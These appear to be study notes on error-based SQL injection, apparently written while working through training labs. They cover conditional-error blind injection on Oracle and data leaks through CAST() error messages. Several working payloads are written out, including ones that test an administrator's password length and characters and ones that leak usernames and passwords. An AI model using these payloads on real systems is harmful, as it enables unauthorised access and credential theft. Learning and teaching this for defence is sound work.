Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones.
---
## Error-based (conditional errors) SQLi with blind context
> (Here when you get an error, that means your query was true)

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in Boolean-based [[Blind SQLi]] won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. 

You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

> [!example] Error-based blind SQLi
> (This is just an example(Not accurate). Real usage of Oracle DB below this note!)
> Suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
> 
> ```sql
> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
> xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
> ```
> 
> These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:
> 
> - With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
> - With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.
> 
> If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
> 
> Using this technique, you can retrieve data by testing one character at a time:
> 
> ```sql
> xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
> ```

> There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.

Next 2 examples of this are from Oracle DB:

> [!important] Password Length Check
> Checking for password length in DB using Error-based blind SQLi
> ```sql
> 'AND (SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
> ```

> [!important] Password Brute Force Checking
>  Checking first letter of password from a specific user
> ```sql
> 'AND (SELECT CASE WHEN SUBSTR(password,1,1)='b' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
> ```

Check out [this video](https://youtu.be/HjXUtCKm1FM) by z3nsh3ll to learn more on conditional error based blind SQLi

---
## Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:

```http
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

```http
ERROR: invalid input syntax for type integer: "Example data"
```

This type of query may also be useful if a character limit prevents you from triggering conditional responses.

> [!example] **Example From the Lab**
> We start with
> ```sql
> xyz' AND CAST((SELECT 1) AS int)--
> ```
> 
> This gives error saying AND has to be a boolean expression. So make it one
> ```sql
> xyz' AND 1=CAST((SELECT 1) AS int)--
> ```
> 
> You no longer get the error. Now replace the SELECT query with something we want
> ```sql
> xyz' AND 1=CAST((SELECT username FROM users) AS int)--
> ```
> 
> Now the query gets cut because of character limit. Remove the XYZ characters. (It was a tracking cookie in our case)
> 
> ```sql
> ' AND 1=CAST((SELECT username FROM users) AS int)--
> ```
> Now it gives an error saying it returned more than one row. So limit it to one
> 
> ```sql
> ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
> ```
> 
> Now, the error message **Leaks** the first username in the DB users table. Get the password
> ```sql
> ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
> ```